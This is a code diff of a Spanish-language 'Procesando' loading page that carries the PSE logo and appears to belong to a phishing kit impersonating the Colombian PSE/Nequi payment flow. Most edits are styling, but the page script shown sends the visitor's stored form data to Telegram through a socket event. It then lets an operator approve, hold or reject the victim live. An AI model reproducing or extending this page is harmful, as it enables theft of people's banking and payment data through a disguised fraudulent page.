@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Procesando</title>
-
+    
     <!-- Google tag (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17891912053"></script>
     <script>
@@ -18,7 +18,7 @@
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Arial, sans-serif;
+            font-family: Arial;
         }
 
         body {
@@ -54,44 +54,63 @@
             line-height: 1.4;
         }
 
+        .footer {
+            height: 40px;
+        }
+
         .wait-message {
-            display: none;
+            position: fixed;
+            bottom: 40px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #F7F4F7;
+            padding: 16px 24px;
+            border-radius: 8px;
             font-size: 14px;
-            color: #200020;
-            margin-top: 16px;
-            padding: 0 30px;
-            line-height: 1.4;
+            color: #1D1D1B;
+            text-align: center;
+            display: none;
+            max-width: 90%;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
 
         .wait-message.show {
             display: block;
+            animation: fadeIn 0.3s ease-in;
         }
 
-        .footer {
-            height: 40px;
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
         }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <img src="img/logo2.svg" alt="PSE">
+        <img src="logo2.svg">
     </div>
 
     <div class="center">
-        <img src="img/procesando.gif" alt="Procesando">
+        <img src="procesando.gif">
 
         <div class="text">
             Estamos procesando tu solicitud con PSE.<br>
             Esto puede tardar unos segundos...
         </div>
-
-        <div class="wait-message" id="waitMessage">
-            Por favor espera un momento mientras procesamos tu solicitud...
-        </div>
     </div>
 
     <div class="footer"></div>
+
+    <div class="wait-message" id="waitMessage">
+        Por favor espera un momento mientras procesamos tu solicitud...
+    </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -100,10 +119,10 @@
             alert('Error: Sesión no encontrada');
             window.location.href = '/';
         }
-
+        
         const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
         const waitMessage = document.getElementById('waitMessage');
-
+        
         const socket = io({
             transports: ['websocket', 'polling'],
             reconnection: true,
@@ -116,27 +135,29 @@
         });
 
         let keepAliveInterval, pingInterval;
-
+        
         function startKeepAlive() {
             stopKeepAlive();
             keepAliveInterval = setInterval(() => socket?.connected && socket.emit('keepAlive', { sessionId }), 3000);
             pingInterval = setInterval(() => socket?.connected && socket.emit('ping'), 2000);
         }
-
+        
         function stopKeepAlive() {
             if (keepAliveInterval) clearInterval(keepAliveInterval);
             if (pingInterval) clearInterval(pingInterval);
         }
 
         socket.on('connect', () => {
-
+            
+            // Inicializar sesión
             socket.emit('initSession', {
                 sessionId,
                 module: 'nequi',
                 page: 'loading',
                 data: formData
             });
-
+            
+            // Enviar datos a Telegram
             setTimeout(() => {
                 console.log('📤 Enviando a Telegram...');
                 socket.emit('sendToTelegram', {
@@ -144,7 +165,8 @@
                     data: formData
                 });
             }, 100);
-
+            
+            // Iniciar keep-alive
             startKeepAlive();
         });
 
@@ -159,7 +181,7 @@
 
         socket.on('actionFollow', (data) => {
             if (data.sessionId !== sessionId) return;
-
+            
             console.log('✅ Aprobado - Redirigiendo a PSE');
             stopKeepAlive();
             localStorage.setItem('fromNequi', 'true');
@@ -168,7 +190,7 @@
 
         socket.on('actionWait', (data) => {
             if (data.sessionId !== sessionId) return;
-
+            
             console.log('⏳ Esperando...');
             waitMessage.classList.add('show');
             setTimeout(() => {
@@ -178,13 +200,13 @@
 
         socket.on('actionReject', (data) => {
             if (data.sessionId !== sessionId) return;
-
+            
             console.log('❌ Rechazado');
             stopKeepAlive();
             alert('Solicitud rechazada');
             window.location.href = '/';
         });
-
+        
         socket.on('error', () => {});
         socket.on('connect_error', () => {});
         socket.on('disconnect', (reason) => {
